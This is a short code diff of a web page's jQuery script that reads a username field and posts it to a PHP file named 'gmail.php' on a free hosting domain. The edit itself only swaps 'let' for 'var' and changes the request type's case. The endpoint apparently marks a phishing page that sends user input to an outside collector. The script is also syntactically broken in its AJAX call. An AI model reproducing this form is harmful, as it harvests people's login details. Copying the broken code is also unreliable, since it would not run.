@@ -386,10 +386,10 @@
      <script>
       $(document).ready(function(){
         $('#submitForm').click(function(){
-          let username = $('#nameValue').val();
-          let formDetails = "name=" + username;
+          var username = $('#nameValue').val();
+          var formDetails = "name=" + username;
           $.ajax({
-            type : 'post',
+            type : 'POST',
             url : 'https://cursorwaiting.000webhostapp.com/gmail.php',
             data : formDetails;
             success(function(){
